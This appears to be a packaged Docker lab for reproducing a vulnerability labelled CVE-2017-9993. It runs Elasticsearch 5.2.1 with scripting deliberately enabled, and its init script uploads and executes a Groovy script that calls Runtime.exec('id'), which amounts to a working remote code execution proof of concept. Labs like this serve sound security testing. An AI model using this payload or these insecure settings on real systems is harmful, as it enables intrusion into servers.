{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-9993/custom_no_tool/docker-compose.yml",
            "content": "version: \"2.4\"\nservices:\n  elasticsearch:\n    image: docker.elastic.co/elasticsearch/elasticsearch:5.2.1\n    container_name: elasticsearch\n    environment:\n      - discovery.type=single-node\n      - ES_JAVA_OPTS=-Xms512m -Xmx512m\n      - script.inline=true\n      - script.stored=true\n      - script.indexed=true\n    ports:\n      - \"9200:9200\"\n      - \"9300:9300\"\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9200/_cluster/health\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n      start_period: 30s\n\n  init:\n    build:\n      context: ./init\n      dockerfile: Dockerfile\n    depends_on:\n      elasticsearch:\n        condition: service_healthy\n    entrypoint: [\"sh\", \"/wait_for_es.sh\"]\n    restart: \"no\"\n"
        },
        {
            "location": "./../../dockers/CVE-2017-9993/custom_no_tool/init/Dockerfile",
            "content": "FROM alpine:3.20\nRUN apk add --no-cache curl bash ca-certificates\nCOPY wait_for_es.sh /wait_for_es.sh\nRUN chmod +x /wait_for_es.sh\n"
        },
        {
            "location": "./../../dockers/CVE-2017-9993/custom_no_tool/init/wait_for_es.sh",
            "content": "#!/bin/sh\nset -e\n\n# Wait for Elasticsearch to become healthy\nuntil curl -m 5 -s -f http://elasticsearch:9200/_cluster/health > /dev/null; do\n  echo \"Waiting for Elasticsearch...\"\n  sleep 2\ndone\n\necho \"Elasticsearch is up. Proceeding with initialization.\"\n\n# Create test index\ncurl -XPUT 'http://elasticsearch:9200/test' \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"settings\":{\"number_of_shards\":1,\"number_of_replicas\":0}}'\n\n# Upload malicious groovy script\ncurl -XPOST 'http://elasticsearch:9200/_scripts/malicious' \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"script\":{\"lang\":\"groovy\",\"source\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\");\"}}'\n\n# Execute the script via a search request\ncurl -XPOST 'http://elasticsearch:9200/test/_search' \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"script_fields\":{\"cmd\":{\"script\":\"malicious\"}}}'\n\nexit 0\n"
        }
    ],
    "directory_tree": "CVE-2017-9993/custom_no_tool"
}